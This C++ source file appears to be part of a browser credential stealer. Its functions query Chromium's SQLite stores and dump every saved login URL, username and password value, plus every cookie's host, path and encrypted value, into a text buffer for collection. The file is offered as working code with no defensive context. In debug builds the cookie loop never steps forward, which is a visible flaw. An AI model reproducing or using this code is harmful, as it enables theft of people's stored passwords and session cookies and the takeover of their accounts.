#include "Chromium.h"

namespace Chromium {

    std::stringstream get_credentials(sqlite3 *db){
        std::stringstream dump(std::string(""));
        sqlite3_stmt *stmt;

        int res = sqlite3_prepare(db, SQLITE_QUERY_CREDENTIALS, -0x1, &stmt, 0x0);
        if(res != SQLITE_OK){
            std::cerr << "[!] Error while preparing statement: " << sqlite3_errmsg(db) << std::endl;
            return dump;
        }

        int i = 0x0;
        res = sqlite3_step(stmt);
        while(res == SQLITE_ROW) {
            ++i;
#ifdef _DEBUG
                std::cout << "[+] \'sqlite3_step\' res: " << res << std::endl;
#endif

            // "SELECT action_url, username_value, password_value FROM logins"
            dump << "[" << i << "]" << std::endl;
            dump << "# action_url = \'" << (char *) sqlite3_column_text(stmt, 0x0) << "\'" << std::endl;
            dump << "# username_value = \'" << (char *) sqlite3_column_text(stmt, 0x1) << "\'" << std::endl;
            dump << "# password_value = \'" << (char *) sqlite3_column_text(stmt, 0x2) << "\'" << std::endl;

#ifdef _DEBUG
            std::cout << "# action_url = \'" << (char *) sqlite3_column_text(stmt, 0x0) << "\'" << std::endl
                << "# username_value = \'" << (char *) sqlite3_column_text(stmt, 0x1) << "\'" << std::endl
                << "# password_value = \'" << (char *) sqlite3_column_text(stmt, 0x2) << "\'" << std::endl;
#endif
            res = sqlite3_step(stmt);
        }

        res = sqlite3_finalize(stmt);
        return dump;
    }

    std::stringstream get_cookies(sqlite3 *db){
        std::stringstream dump(std::string(""));   // stringstream for our output
        sqlite3_stmt *stmt;

        // Compiling an SQL Statement into a virtual machine (byte-code program)
        int res = sqlite3_prepare(db, SQLITE_QUERY_COOKIES, -0x1, &stmt, 0x0);
        if(res != SQLITE_OK){
            std::cerr << "[!] Error while preparing statement: " << sqlite3_errmsg(db) << std::endl;
            return dump;
        }
#ifdef _DEBUG
            std::cout << "[+] Statement prepared.." << std::endl;
#endif
        int i = 0x0;
        res = sqlite3_step(stmt);
        while(res == SQLITE_ROW) {
            ++i;
#ifdef _DEBUG
                std::cout << "[+] \'sqlite3_step\' res: " << res << std::endl; 
#endif
            dump << "[" << i << "]" << std::endl;
            dump << "# HOST_KEY = \'" << (char *) sqlite3_column_text(stmt, 0x0) << "\'" << std::endl;
            dump << "# path = \'" << (char *) sqlite3_column_text(stmt, 0x1) << "\'" << std::endl;
            dump << "# encrypted_value = \'" << (char *) sqlite3_column_text(stmt, 0x2) << "\'" << std::endl << std::endl;

#ifdef _DEBUG
            std::cout << "[+] HOST_KEY = \'" << sqlite3_column_text(stmt, 0x0) << "\'" << std::endl 
                << " path = \'" << sqlite3_column_text(stmt, 0x1) << "\'" << std::endl 
                << "encrypted_value = \'" << sqlite3_column_text(stmt, 0x2) << "\'" << std::endl;
#else
            res = sqlite3_step(stmt);
#endif
        }

        // Release resources
        res = sqlite3_finalize(stmt);
        
        return dump;
    }

}